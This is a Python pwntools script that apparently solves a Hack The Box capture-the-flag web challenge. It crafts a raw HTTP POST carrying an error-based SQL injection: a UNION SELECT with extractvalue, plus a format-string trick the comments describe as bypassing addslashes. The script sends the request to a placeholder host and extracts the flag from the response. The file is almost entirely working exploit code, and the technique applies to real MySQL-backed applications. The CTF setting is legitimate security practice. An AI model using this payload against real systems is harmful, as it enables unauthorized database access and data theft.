
from pwn import *
import re

injection = 'select * from totally_not_a_flag'  # Our SQL Injection
body = f"pass=%1$') UNION SELECT 1,extractvalue(0x0a,concat(0x0a,({injection})))#"  # Our Body with the injection and the addslashes bypass
payload = "POST / HTTP/1.0\r\n"  # Using http1.0 because 1.1 didn't work for some reason
payload += "Content-Type: application/x-www-form-urlencoded\r\n"
payload += "Content-Length: {}\r\n".format(len(body))
payload += "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
payload += "Connection: close\r\n"
payload += "\r\n"
payload += "{}\r\n".format(body)
payload += "\r\n"
print(payload)  # Check our payload
s = remote('host', port)  # Connect to the remote
s.send(payload)  # Send the exploit payload

response = s.recvrepeat(10).decode('utf8')  # Get our response
flag = re.findall("HTB.*", response)  # Get the flag
print(flag[0])  # Print the flag

s.close()

# http://www.securityidiots.com/Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-Extractvalue.html
# https://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php
